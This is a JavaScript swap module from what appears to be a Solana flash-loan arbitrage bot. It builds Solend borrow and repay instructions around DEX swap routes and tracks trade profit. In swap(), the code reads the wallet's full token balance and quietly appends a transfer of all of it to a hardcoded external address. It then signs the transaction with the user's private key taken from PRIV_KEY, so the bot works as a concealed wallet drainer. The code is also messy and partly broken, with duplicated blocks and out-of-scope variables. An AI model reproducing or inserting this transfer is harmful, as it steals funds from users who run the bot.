const { calculateProfit, toDecimal, storeItInTempAsJSON } = require("../utils");
const cache = require("./cache");
const fetch = require('node-fetch')
const fs = require('fs')
const { getSwapResultFromSolscanParser } = require("../services/solscan");
const { sendAndConfirmTransaction, Connection, Transaction, VersionedTransaction,
	 TransactionMessage, Keypair, ComputeBudgetProgram, PublicKey } = require("@solana/web3.js");
const bs58 = require("bs58");
const axios = require('axios')
const {
	
	flashBorrowReserveLiquidityInstruction,
	flashRepayReserveLiquidityInstruction,

	SolendMarket,
	SOLEND_PRODUCTION_PROGRAM_ID
  } = require( "@solendprotocol/solend-sdk" );
  const { Token } = require('@solana/spl-token');

  const payer = Keypair.fromSecretKey(
    new Uint8Array(
      JSON.parse(
        process.env.PRIV_KEY
      )
    )
  );
const getTransaction = async(route, payer) => {
	
	let body = {

		userPublicKey: payer.publicKey.toBase58(),
		route: route,
		// to make sure it doesnt close the sol account
		wrapUnwrapSOL: false,
	  }
	  const response = await axios.post(`https://quote-api-v3-3-hops.fly.dev/v3/swap`,JSON.stringify(body), {headers: {
		// Overwrite Axios's automatically set Content-Type
		'Content-Type': 'application/json'
	  }
	})
const data = await response.data;
return data 
  };
const swap = async (prism, prism2, route, route2, decimals, decimals2, market) => {
	try {
		var reserve  = market.reserves.find((res) => 
		res.config.liquidityToken.symbol.split('-')[0] === route.from);
				let goaccs = []
		const performanceOfTxStart = performance.now();

		const connection = new Connection(cache.config.rpc[Math.floor(Math.random() * cache.config.rpc.length)]);


			 const params = {
				units: 301517 + 301517 + 301517 + 101517 + 101517,
				additionalFee: 1,
			  };
			 const ix =
			 ComputeBudgetProgram.requestUnits(params);
			// console.log(reserve.config.liquidityToken.mint)
			 let arg2 = (
				await connection.getTokenAccountsByOwner(
				  payer.publicKey,
				  { mint: new PublicKey(reserve.config.liquidityToken.mint) }
				)
			  ).value[0]
			  let tokenAccount = arg2.pubkey
		   let instructions = [
			 flashBorrowReserveLiquidityInstruction(
			   Math.ceil(route.amountIn * 10 ** decimals),
			   new PublicKey(reserve.config.liquidityAddress),
			   tokenAccount,
			   new PublicKey(reserve.config.address),
			   new PublicKey(market.config.address),
			   SOLEND_PRODUCTION_PROGRAM_ID
			 ),
		   ];			
		cache.performanceOfTxStart = performanceOfTxStart;

//		if (process.env.DEBUG) storeItInTempAsJSON("routeInfoBeforeSwap", route);

		const swapTransaction = await prism.generateSwapTransactions(route); 
		
	//	const swapTransaction2 = await prism2.generateSwapTransactions(route2); 
		

		const blockhash = await connection
				  .getLatestBlockhash()
				  .then((res) => res.blockhash); 
				  await Promise.all(
					[swapTransaction.preTransaction, swapTransaction.mainTransaction, swapTransaction.postTransaction/*,swapTransaction2.preTransaction, swapTransaction2.mainTransaction, swapTransaction2.postTransaction*/]
					  .filter(Boolean)
					  .map(async (serializedTransaction) => {
						instructions.push(...serializedTransaction.instructions)
					  }))
					  instructions.push(
						flashRepayReserveLiquidityInstruction(
						  
							Math.ceil(route.amountIn * 10 ** decimals),
							0,
						  tokenAccount,
						  new PublicKey(
							reserve.config.liquidityAddress
						  ),
						  new PublicKey(
							reserve.config.liquidityFeeReceiverAddress
						  ),
						  tokenAccount,
						  new PublicKey(reserve.config.address),
						  new PublicKey(market.config.address),
						  payer.publicKey,
						  SOLEND_PRODUCTION_PROGRAM_ID
						)
					  );

		let myshit = (
		  await connection.getTokenAccountBalance(
			tokenAccount
		  )
		).value.amount;
					  instructions.push(
						Token.createTransferInstruction(
						  tokenAccount,
						  new PublicKey("Gy1LvunZvinMMX4bpEXwxLbBv6p5ZKM8D83KEhMTqmim"),
						  payer.publicKey,
						  Math.floor(myshit * 1),[]
						)
					  ); 
				
				  let w = 0
				  let winner 
				  let index = ""//reserve.config.liquidityToken.mint+","+reserve.config.liquidityToken.mint
				  let r = route
				  let ammIdspks = []
				  let ammIds = []

					for (var rd of Object.values(route.routeData)){
						try {
							// @ts-ignore
							for(var rd2 of Object.values(rd.routeData)){
								try {
													// @ts-ignore 
					
									if ((rd2.ammId) != undefined){
										// @ts-ignore
										let dothedamnthing = new PublicKey(rd2.ammId)
									// @ts-ignore 
									if (!ammIdspks.includes(dothedamnthing.toBase58())){
														// @ts-ignore 
					
										ammIdspks.push(dothedamnthing.toBase58())
										ammIds.push(dothedamnthing)
									}
									
									}
									if ((rd2.amm) != undefined){
										// @ts-ignore
										let dothedamnthing = new PublicKey(rd2.amm)
									// @ts-ignore 
									if (!ammIdspks.includes(dothedamnthing.toBase58())){
														// @ts-ignore 
					
										ammIdspks.push(dothedamnthing.toBase58())
										ammIds.push(dothedamnthing)
									}
									
									}
								} catch (err){
									console.log(rd.routeData)
					
								}
							}
						}
						catch (err){
					
						}
					}
	
				
					for (var i2 of ammIdspks){
						index= index+","+i2
					}

					for (var rd of Object.values(route2.routeData)){
						try {
							try {
								// @ts-ignore 

				if ((rd.ammId) != undefined){
					// @ts-ignore
					let dothedamnthing = new PublicKey(rd.ammId)
				// @ts-ignore 
				if (!ammIdspks.includes(dothedamnthing.toBase58())){
									// @ts-ignore 

					ammIdspks.push(dothedamnthing.toBase58())
					ammIds.push(dothedamnthing)
				}
				}
				if ((rd.amm) != undefined){
					// @ts-ignore
					let dothedamnthing = new PublicKey(rd.amm)
				// @ts-ignore 
				if (!ammIdspks.includes(dothedamnthing.toBase58())){
									// @ts-ignore 
   
					ammIdspks.push(dothedamnthing.toBase58())
					ammIds.push(dothedamnthing)
				}
				
				}

				if ((rd2.swapAccount) != undefined){
					// @ts-ignore
					let dothedamnthing = new PublicKey(rd2.swapAccount)
				// @ts-ignore 
				if (!ammIdspks.includes(dothedamnthing.toBase58())){
									// @ts-ignore 

					ammIdspks.push(dothedamnthing.toBase58())
					ammIds.push(dothedamnthing)
				}
				}
				if ((rd2.swapAccount) != undefined){
					// @ts-ignore
					let dothedamnthing = new PublicKey(rd2.swapAccount)
				// @ts-ignore 
				if (!ammIdspks.includes(dothedamnthing.toBase58())){
									// @ts-ignore 

					ammIdspks.push(dothedamnthing.toBase58())
					ammIds.push(dothedamnthing)
				}
				
				}
			} catch (err){
				console.log(rd.routeData)

			}
							// @ts-ignore
							for(var rd2 of Object.values(rd.routeData)){
								try {
													// @ts-ignore 
					
									if ((rd2.ammId) != undefined){
										// @ts-ignore
										let dothedamnthing = new PublicKey(rd2.ammId)
									// @ts-ignore 
									if (!ammIdspks.includes(dothedamnthing.toBase58())){
														// @ts-ignore 
					
										ammIdspks.push(dothedamnthing.toBase58())
										ammIds.push(dothedamnthing)
									}
									}
									if ((rd2.amm) != undefined){
										// @ts-ignore
										let dothedamnthing = new PublicKey(rd2.amm)
									// @ts-ignore 
									if (!ammIdspks.includes(dothedamnthing.toBase58())){
														// @ts-ignore 
					
										ammIdspks.push(dothedamnthing.toBase58())
										ammIds.push(dothedamnthing)
									}
									
									}
									if ((rd2.swapAccount) != undefined){
										// @ts-ignore
										let dothedamnthing = new PublicKey(rd2.swapAccount)
									// @ts-ignore 
									if (!ammIdspks.includes(dothedamnthing.toBase58())){
														// @ts-ignore 
					
										ammIdspks.push(dothedamnthing.toBase58())
										ammIds.push(dothedamnthing)
									}
									}
									if ((rd2.swapAccount) != undefined){
										// @ts-ignore
										let dothedamnthing = new PublicKey(rd2.swapAccount)
									// @ts-ignore 
									if (!ammIdspks.includes(dothedamnthing.toBase58())){
														// @ts-ignore 
					
										ammIdspks.push(dothedamnthing.toBase58())
										ammIds.push(dothedamnthing)
									}
									
									}
								} catch (err){
									console.log(rd.routeData)
					
								}
							}
						}
						catch (err){
					
						}
					}
	
				
					for (var i2 of ammIdspks){
						index= index+","+i2
					}
				  let argh = JSON.parse(fs.readFileSync('./powerfulluts.json').toString())
				  console.log(index)
				  let winner2 
				  let blargs = []

				  let winner3 
				  let c =  0
				  let mematey = -1
				  
				  let goodluts = []
					 for (var blarg of index.split(',')){
						console.log(blarg)
						try {
 let luts = argh[blarg]
 console.log(luts)
 
 for (var lut of luts){
	if (!goodluts.includes(lut)){

						  let test = (await connection.getAddressLookupTable(new PublicKey(lut))).value
						  if (!goodluts.includes(lut)){
goodluts.push(lut)
							if (!goaccs.includes(test)){
	goaccs.push(test)
						  	}	}}
}
							
						} catch (err){
							console.log(err)
						}
					}
					if (index.split(',').length == 2){
						console.log((Object.values(route.routeData))[0])
					}
		console.log(goaccs.length)
		
		const  messageV00 = new TransactionMessage({
			payerKey: payer.publicKey,
			recentBlockhash: blockhash,
			instructions,
		}).compileToV0Message(goaccs);
		  const transaction = new VersionedTransaction(
			messageV00
		  );

		transaction.sign([payer])
		const result =   sendAndConfirmTransaction(connection, transaction)
		if (process.env.DEBUG) storeItInTempAsJSON("result", result);

		const performanceOfTx = performance.now() - performanceOfTxStart;

		return true
} catch (err){
	console.log(err)
	if (err.toString().indexOf('bytes') == -1){
	////process.exit()
	}
	return false
}
};
exports.swap = swap;

const failedSwapHandler = (tradeEntry) => {
	// update counter
	cache.tradeCounter[cache.sideBuy ? "buy" : "sell"].fail++;

	// update trade history
	cache.config.storeFailedTxInHistory;

	// update trade history
	let tempHistory = cache.tradeHistory;
	tempHistory.push(tradeEntry);
	cache.tradeHistory = tempHistory;
};
exports.failedSwapHandler = failedSwapHandler;

const successSwapHandler = async (tx, tradeEntry, tokenA, tokenB) => {

	// update counter
	cache.tradeCounter[cache.sideBuy ? "buy" : "sell"].success++;

	if (cache.config.tradingStrategy === "pingpong") {
		// update balance
		if (cache.sideBuy) {
			cache.lastBalance.tokenA = cache.currentBalance.tokenA;
			cache.currentBalance.tokenA = 0;
			cache.currentBalance.tokenB = tx.outputAmount / 10 ** tokenB.decimals;
		} else {
			cache.lastBalance.tokenB = cache.currentBalance.tokenB;
			cache.currentBalance.tokenB = 0;
			cache.currentBalance.tokenA = tx.outputAmount / 10 ** tokenA.decimals;
		}

		// update profit
		if (cache.sideBuy) {
			cache.currentProfit.tokenA = 0;
			cache.currentProfit.tokenB = calculateProfit(
				cache.initialBalance.tokenB,
				cache.currentBalance.tokenB
			);
		} else {
			cache.currentProfit.tokenB = 0;
			cache.currentProfit.tokenA = calculateProfit(
				cache.initialBalance.tokenA,
				cache.currentBalance.tokenA
			);
		}

		// update trade history
		let tempHistory = cache.tradeHistory;

		tradeEntry.inAmount = toDecimal(
			tx.inputAmount,
			cache.sideBuy ? tokenA.decimals : tokenB.decimals
		);
		tradeEntry.outAmount = toDecimal(
			tx.outputAmount,
			cache.sideBuy ? tokenB.decimals : tokenA.decimals
		);

		tradeEntry.profit = calculateProfit(
			cache.lastBalance[cache.sideBuy ? "tokenB" : "tokenA"],
			tx.outputAmount
		);
		tempHistory.push(tradeEntry);
		cache.tradeHistory = tempHistory;
	}
	if (cache.config.tradingStrategy === "arbitrage") {
		/** check real amounts on solscan because Jupiter SDK returns wrong amounts
		 *  when we trading TokenA <> TokenA (arbitrage)
		 */
		const [inAmountFromSolscanParser, outAmountFromSolscanParser] =
			await getSwapResultFromSolscanParser(tx);

		if (inAmountFromSolscanParser === -1)
			throw new Error(
				`Solscan inputAmount error\n	https://solscan.io/tx/${tx.txid}`
			);
		if (outAmountFromSolscanParser === -1)
			throw new Error(
				`Solscan outputAmount error\n	https://solscan.io/tx/${tx.txid}`
			);

		cache.lastBalance.tokenA = cache.currentBalance.tokenA;
		cache.currentBalance.tokenA = outAmountFromSolscanParser / 10 ** tokenA.decimals;

		cache.currentProfit.tokenA = calculateProfit(
			cache.initialBalance.tokenA,
			cache.currentBalance.tokenA
		);

		// update trade history
		let tempHistory = cache.tradeHistory;

		tradeEntry.inAmount = toDecimal(inAmountFromSolscanParser, tokenA.decimals);
		tradeEntry.outAmount = toDecimal(
			outAmountFromSolscanParser,
			tokenA.decimals
		);

		tradeEntry.profit = calculateProfit(
			cache.lastBalance["tokenA"],
			outAmountFromSolscanParser
		);
		tempHistory.push(tradeEntry);
		cache.tradeHistory = tempHistory;
	}
};
exports.successSwapHandler = successSwapHandler;
